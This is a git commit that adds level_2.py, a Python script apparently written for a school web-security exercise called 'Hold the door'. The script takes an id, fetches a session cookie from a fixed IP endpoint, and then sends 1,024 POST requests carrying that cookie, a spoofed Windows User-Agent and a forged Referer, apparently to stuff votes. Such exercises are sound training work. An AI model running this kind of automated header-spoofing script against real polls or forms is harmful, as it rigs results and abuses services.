dd19f322a97b73d9b1c0088e4dc71523dc9a3c95
lulimsky <3337@holbertonshool.com>
2022-02-05 21:23:50 +0000

    level_2

---
+++ level_2/level_2.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python3
+
+import requests
+import sys
+
+# Get ID from command line
+if len(sys.argv) != 2:
+    print("Usage python " + sys.argv[0] + " id")
+    quit()
+
+# Check if id is numerical
+input = sys.argv[1]
+
+try:
+    id = int(input)
+except ValueError:
+    print("Error: id must be a number")
+    quit()
+
+# Set the endpoint
+URI = "http://158.69.76.135/level2.php"
+
+# Get cookie
+response = requests.post(URI)
+key = response.cookies["HoldTheDoor"]
+
+# Set the form data
+data = {
+    'id': id,
+    'holdthedoor': 'submit',
+    "key": key
+}
+
+# Make him think it's Windows
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) \
+(KHTML, like Gecko) Chrome/77.0.3865.120',
+    'Referer': 'http://158.69.76.135/level2.php'
+}
+
+for i in range(0, 1024):
+    # Send POST request
+    response = requests.post(URI, data=data,
+                             cookies={"HoldTheDoor": key}, headers=headers)
+    print("POST " + str(i + 1) + " HTTP result: " + str(response))
